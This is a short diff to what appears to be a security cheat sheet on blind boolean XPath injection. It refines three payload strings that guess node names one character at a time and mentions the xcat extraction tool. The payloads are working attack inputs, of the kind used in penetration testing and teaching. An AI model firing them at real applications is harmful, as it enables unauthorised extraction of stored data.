@@ -44,9 +44,9 @@ Enumerate one character at a time with this technique.
 If you get a **TRUE** condition you know the first character is *b*
 
 ```bash
-' or substring(name(/users/*),1,1)='a
-' or substring(name(/users/*),1,1)='b
-' or substring(name(/users/*),2,1)='b
+' or substring(name(/users/*[1]),1,1)='a
+' or substring(name(/users/*[1]),1,1)='b
+' or substring(name(/users/*[1]),2,1)='b
 ```
 # Enumerate Blind Bolean injections with xcat
 You can see here how to use xcat (Tool for injection auto blind bolean to extract) 
